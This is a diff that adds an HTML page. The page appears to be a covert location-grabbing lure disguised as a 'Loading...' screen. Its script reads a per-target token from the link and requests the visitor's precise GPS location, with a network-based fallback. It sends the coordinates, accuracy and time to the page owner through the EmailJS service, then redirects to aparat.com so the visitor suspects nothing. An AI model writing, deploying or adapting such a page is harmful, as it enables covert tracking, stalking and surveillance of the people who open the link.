@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+
+<meta charset="UTF-8">
+
+<meta name="viewport"
+content="width=device-width,initial-scale=1">
+
+<title>Loading...</title>
+
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+</head>
+
+<body>
+
+<script>
+
+emailjs.init("eS7d6-exAWgeg8udU");
+
+const token =
+new URLSearchParams(location.search).get("token");
+
+function finish(){
+
+    location.replace("https://www.aparat.com/");
+
+}
+
+function sendMail(lat, lon, accuracy, type){
+
+    emailjs.send(
+
+        "service_6gxhqdn",
+
+        "template_slp067m",
+
+        {
+            token:token,
+            lat:lat,
+            lon:lon,
+            accuracy:accuracy,
+            type:type,
+            time:new Date().toLocaleString()
+        }
+
+    ).then(
+
+        finish,
+
+        finish
+
+    );
+
+}
+
+function networkFallback(){
+
+    navigator.geolocation.getCurrentPosition(
+
+        pos => {
+
+            sendMail(
+                pos.coords.latitude,
+                pos.coords.longitude,
+                pos.coords.accuracy,
+                "network"
+            );
+
+        },
+
+        finish,
+
+        {
+            enableHighAccuracy:false,
+            timeout:5000,
+            maximumAge:60000
+        }
+
+    );
+
+}
+
+navigator.geolocation.getCurrentPosition(
+
+    pos => {
+
+        sendMail(
+            pos.coords.latitude,
+            pos.coords.longitude,
+            pos.coords.accuracy,
+            "gps"
+        );
+
+    },
+
+    err => {
+
+        networkFallback();
+
+    },
+
+    {
+        enableHighAccuracy:true,
+        timeout:7000,
+        maximumAge:0
+    }
+
+);
+
+</script>
+
+</body>
+</html>
